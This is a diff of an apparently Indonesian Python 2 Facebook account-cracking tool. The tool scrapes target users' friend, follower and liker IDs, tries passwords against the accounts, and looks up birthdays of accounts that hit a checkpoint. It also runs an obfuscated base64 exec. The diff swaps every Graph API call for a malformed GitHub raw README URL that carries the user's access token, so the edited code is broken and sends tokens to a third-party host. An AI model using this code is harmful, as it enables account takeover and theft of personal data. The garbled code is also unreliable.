@@ -116,7 +116,7 @@ def masuk():
         if romz in(""):
         	print("%s [!] Isi yang benar kentod "%(M));exit()
     	try:
-            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
+            gas = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.mdme?access_token=%s'%(romz)).json()['name']
             print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
             open('token.txt', 'w').write(romz);login_xx()
             exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
@@ -153,11 +153,11 @@ def publik(romz,headers=header):
     try:
     	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
         idt = raw_input(' [∆] Target id : %s'%(H))
-        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
+        gas = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s?access_token=%s'%(idt,romz))
         nm = json.loads(gas.text)
         file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
         bff = open(file, 'w')
-        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
+        r = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
         z = json.loads(r.text)
         for a in z['friends']['data']:
             id.append(a['id'] + '<=>' + a['name'])
@@ -181,7 +181,7 @@ def massal(romz, headers=header):
 
     try:
     	print "\n%s [%s+%s] %sUsahakan Tumbal Akun Menggunakan Token EAAAAU"%(P,U,P,H)
-        jum = int(raw_input('\n%s [%s+%s] Jumlah id%s : %s'%(P,H,P,U,H)))
+        jum = int(raw_input('\n%s [%s+%s] shayan id%s : %s'%(P,H,P,U,H)))
     except:
         jum = 1
 
@@ -193,7 +193,7 @@ def massal(romz, headers=header):
         t += 1
         idt = raw_input('%s [%s+%s] Target id : %s'%(P,H,P,H))
         try:
-            for _x_ in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, romz)).json()['data']:
+            for _x_ in requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s/friends?access_token=%s' % (idt, romz)).json()['data']:
                 id.append(_x_['id'] + '<=>' + _x_['name'])
                 bff.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
 
@@ -215,11 +215,11 @@ def followers(romz,headers=header):
     	print ("\n%s [%s!%s] Ketik '%sme%s' jika ingin dump followers sendiri "%(P,M,P,H,P))
         idt = raw_input(' [∆] Target id : %s'%(H))
         batas = raw_input(' %s[∆] Maximal id : %s'%(P,H))
-        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
+        gas = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s?access_token=%s'%(idt,romz))
         nm = json.loads(gas.text)
         file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
         bff = open(file, 'w')
-        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
+        r = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
         z = json.loads(r.text)
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
@@ -244,7 +244,7 @@ def postingan(romz,headers=header):
     	print ("\n%s [%s!%s] Perlu di ingat postingan wajib publik "%(P,M,P))
         idt = raw_input(' [∆] Id post   : %s'%(P))
         simpan = raw_input(' %s[?] Nama file : %s'%(P,H))
-        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
+        r = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s/likes?limit=999999&access_token=%s'%(idt,romz))
         id = []
         z = json.loads(r.text)
         file = ('dump/' + simpan + '.json').replace(' ', '_')
@@ -433,7 +433,7 @@ class ngentod:
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
                     romz = open('token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
+                    lahir = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r %s--> %s ∆ %s ∆ %s %s %s  ' % (orange,user,pw,day,month,year)
@@ -493,7 +493,7 @@ class ngentod:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     romz = open('token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
+                    lahir = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r %s--> %s ∆ %s ∆ %s %s %s ' % (orange,user,pw,day,month,year)
@@ -552,7 +552,7 @@ class ngentod:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     romz = open('token.txt').read()
-                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
+                    lahir = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.md%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
                     print '\r %s--> %s ∆ %s ∆ %s %s %s ' % (orange,user,pw,day,month,year)
@@ -697,7 +697,7 @@ def menu():
     except IOError:
         print ("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
     try:
-        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
+        r = requests.get('https://raw.githubusercontent.com/Shoaibsafi2/sk-sarkar/main/README.mdme?access_token='+romz,headers=header)
         a = json.loads(r.text)
         nama = a["name"]
         id = a['id']
